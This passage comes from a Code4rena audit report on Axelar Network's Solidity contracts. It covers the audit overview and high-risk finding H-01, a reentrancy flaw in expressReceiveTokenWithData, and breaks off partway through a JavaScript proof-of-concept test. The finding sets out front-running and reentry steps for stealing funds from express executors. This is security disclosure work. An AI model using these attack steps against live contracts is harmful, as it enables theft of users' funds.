{
  "circa": {
    "title": "Axelar Network",
    "sponsor": "Axelar Network",
    "slug": "2023-07-axelar",
    "date": "2023-11-29",
    "findings": "https://github.com/code-423n4/2023-07-axelar-findings/issues",
    "contest": 260
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Axelar Network smart contract system written in Solidity. The audit took place between July 12 — July 21 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>48 Wardens contributed reports to the Axelar Network:</p>\n<ol>\n<li><a href=\"https://code4rena.com/@immeas\">immeas</a></li>\n<li><a href=\"https://code4rena.com/@nobody2018\">nobody2018</a></li>\n<li><a href=\"https://code4rena.com/@Jeiwan\">Jeiwan</a></li>\n<li><a href=\"https://code4rena.com/@pcarranzav\">pcarranzav</a></li>\n<li><a href=\"https://code4rena.com/@0xTheC0der\">0xTheC0der</a></li>\n<li><a href=\"https://code4rena.com/@nirlin\">nirlin</a></li>\n<li><a href=\"https://code4rena.com/@Chom\">Chom</a></li>\n<li><a href=\"https://code4rena.com/@QiuhaoLi\">QiuhaoLi</a></li>\n<li><a href=\"https://code4rena.com/@T1MOH\">T1MOH</a></li>\n<li><a href=\"https://code4rena.com/@bart1e\">bart1e</a></li>\n<li><a href=\"https://code4rena.com/@Sathish9098\">Sathish9098</a></li>\n<li>UniversalCrypto (<a href=\"https://code4rena.com/@amaechieth\">amaechieth</a> and <a href=\"https://code4rena.com/@tettehnetworks\">tettehnetworks</a>)</li>\n<li><a href=\"https://code4rena.com/@Shubham\">Shubham</a></li>\n<li><a href=\"https://code4rena.com/@libratus\">libratus</a></li>\n<li><a href=\"https://code4rena.com/@Toshii\">Toshii</a></li>\n<li><a href=\"https://code4rena.com/@Rolezn\">Rolezn</a></li>\n<li><a href=\"https://code4rena.com/@Emmanuel\">Emmanuel</a></li>\n<li><a href=\"https://code4rena.com/@Raihan\">Raihan</a></li>\n<li><a href=\"https://code4rena.com/@Arz\">Arz</a></li>\n<li><a href=\"https://code4rena.com/@SAQ\">SAQ</a></li>\n<li><a href=\"https://code4rena.com/@SM3_SS\">SM3_SS</a></li>\n<li><a href=\"https://code4rena.com/@0xn006e7\">0xn006e7</a></li>\n<li><a href=\"https://code4rena.com/@MrPotatoMagic\">MrPotatoMagic</a></li>\n<li><a href=\"https://code4rena.com/@K42\">K42</a></li>\n<li><a href=\"https://code4rena.com/@niloy\">niloy</a></li>\n<li><a href=\"https://code4rena.com/@KrisApostolov\">KrisApostolov</a></li>\n<li><a href=\"https://code4rena.com/@qpzm\">qpzm</a></li>\n<li><a href=\"https://code4rena.com/@Viktor_Cortess\">Viktor_Cortess</a></li>\n<li><a href=\"https://code4rena.com/@0xkazim\">0xkazim</a></li>\n<li><a href=\"https://code4rena.com/@naman1778\">naman1778</a></li>\n<li><a href=\"https://code4rena.com/@matrix_0wl\">matrix_0wl</a></li>\n<li><a href=\"https://code4rena.com/@DavidGiladi\">DavidGiladi</a></li>\n<li><a href=\"https://code4rena.com/@Udsen\">Udsen</a></li>\n<li><a href=\"https://code4rena.com/@Bauchibred\">Bauchibred</a></li>\n<li><a href=\"https://code4rena.com/@banpaleo5\">banpaleo5</a></li>\n<li><a href=\"https://code4rena.com/@MohammedRizwan\">MohammedRizwan</a></li>\n<li><a href=\"https://code4rena.com/@hals\">hals</a></li>\n<li><a href=\"https://code4rena.com/@0x11singh99\">0x11singh99</a></li>\n<li><a href=\"https://code4rena.com/@petrichor\">petrichor</a></li>\n<li><a href=\"https://code4rena.com/@ybansal2403\">ybansal2403</a></li>\n<li><a href=\"https://code4rena.com/@SY_S\">SY_S</a></li>\n<li><a href=\"https://code4rena.com/@flutter_developer\">flutter_developer</a></li>\n<li><a href=\"https://code4rena.com/@hunter_w3b\">hunter_w3b</a></li>\n<li><a href=\"https://code4rena.com/@ReyAdmirado\">ReyAdmirado</a></li>\n<li><a href=\"https://code4rena.com/@0xAnah\">0xAnah</a></li>\n<li><a href=\"https://code4rena.com/@Walter\">Walter</a></li>\n<li><a href=\"https://code4rena.com/@dharma09\">dharma09</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://code4rena.com/@berndartmueller\" title=\"judge\">berndartmueller (judge)</a>.</p>\n<p>Final report assembled by thebrittfactor.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 11 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 9 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 15 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 21 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-07-axelar\">C4 Axelar Network repository</a>, and is composed of 73 smart contracts written in the Solidity programming language and includes 2797 lines of Solidity code.</p>\n<p>In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, <strong>LightChaser</strong> from warden ChaseTheLight, generated the <a href=\"https://gist.github.com/thebrittfactor/c400e0012d0092316699c53843ecad41\">Automated Findings report</a> and all findings therein were classified as out of scope.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-2\" style=\"position:relative;\"><a href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (2)</h1>\n<h2 id=\"h-01-expressreceivetoken-can-be-abused-using-reentry\" style=\"position:relative;\"><a href=\"#h-01-expressreceivetoken-can-be-abused-using-reentry\" aria-label=\"h 01 expressreceivetoken can be abused using reentry permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/349\">[H-01] <code>expressReceiveToken</code> can be abused using reentry</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/349\">immeas</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/374\">nobody2018</a></em></p>\n<p>A token transfer can be express delivered on behalf of another user when the call contains data to be executed:</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L467-L487\">https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L467-L487</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">467</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expressReceiveTokenWithData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t    </span><span class=\"mtk3\">// ... params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">475:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">476</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isCommandExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">477</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">478</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">caller</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">479</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">ITokenManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ITokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getValidTokenManagerAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">480</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">481</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">482</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">SafeTokenTransferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">caller</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">483</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">484</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_expressExecuteWithInterchainTokenToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">485</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">486</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_setExpressReceiveTokenWithData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">caller</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">487</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>The issue here, is that check effect interactions are not followed.</p>\n<p>There are two attack paths here with varying assumptions and originating parties:</p>\n<p><strong>Attacker: Anyone, assuming there are third parties providing <code>expressReceiveTokenWithData</code> on demand with on-chain call:</strong></p>\n<ol>\n<li>An attacker sends a large token transfer to a chain with a public mempool.</li>\n<li>Once the attacker sees the call by Axelar to <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/cgp/AxelarGateway.sol#L323\"><code>AxelarGateway::exectute</code></a> in the mempool, they front-run this call with a call to the third party providing <code>expressReceiveTokenWithData</code>.</li>\n<li>The third party (victim) transfers the tokens to the <code>destinationAddress</code> contract. Attacker is now <code>+amount</code> from this transfer.</li>\n<li><code>expressExecuteWithInterchainToken</code> on the <code>destinationAddress</code> contract does a call to <code>AxelarGateway::exectute</code> (which can be called by anyone) to submit the report and then a reentry call to <code>InterchainTokenService::execute</code> their <code>commandId</code>. This performs the second transfer from the <code>TokenManager</code> to the <code>destinationAddress</code> (since the <code>_setExpressReceiveTokenWithData</code> has not yet been called). Attacker contract is now <code>+2x amount</code>, having received both the express transfer and the original transfer.</li>\n<li><code>_setExpressReceiveTokenWithData</code> is set, but this <code>commandId</code> has already been executed. The victims funds have been stolen.</li>\n</ol>\n<p><strong>AxelarGateway operator, assuming there are third parties providing <code>expressReceiveTokenWithData</code> off-chain call:</strong></p>\n<p>The operator does the same large transfer as described above. The operator then holds the update to <code>AxelarGateway::execute</code> and instead, sends these instructions to their malicious <code>destinationContract</code>. When the <code>expressReceiveTokenWithData</code> is called, this malicious contract will do the same pattern as described above. Call <code>AxelarGateway::execute</code> then <code>InterchainTokenService::execute</code>.</p>\n<p>The same attacks could work for tokens with transfer callbacks (like ERC777) with just the <code>expressReceiveToken</code> call, as well.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>With a very large cross chain token transfer, a malicious party can use this to steal the same amount from the express receive executor.</p>\n<p>If this fails, since it relies on front-running and some timing, the worst thing that happens for the attacker is that the transfer goes through and they’ve just lost the transfer fees.</p>\n<h3 id=\"note-to-judgesponsor\" style=\"position:relative;\"><a href=\"#note-to-judgesponsor\" aria-label=\"note to judgesponsor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Note to judge/sponsor</h3>\n<p>This makes some assumptions about how trusted an operator/reporter is and that there are possibilities to have <code>expressReceiveTokens</code> to be called essentially on demand (”<code>ExpressReceiveAsAService</code>”). If these aren’t valid, please regard this as a low; just noting the failure to follow checks-effects-interactions in <code>expressReceiveToken</code>/<code>WithData</code>.</p>\n<p>The existence of <code>expressReceive</code> implies though, that there should be some kind of service providing this premium service for a fee.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Test in <code>tokenService.js</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;attacker steals funds from express executor&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deployFunctions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lockUnlock</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`Test Token Lock Unlock`</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;TT&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">12</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expressPayer</span><span class=\"mtk1\"> = (</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSigners</span><span class=\"mtk1\">())[</span><span class=\"mtk7\">5</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expressPayer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expressPayer</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">commandId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getRandomBytes32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deployContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;ExpressRecipient&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                [</span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toLowerCase</span><span class=\"mtk1\">()]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            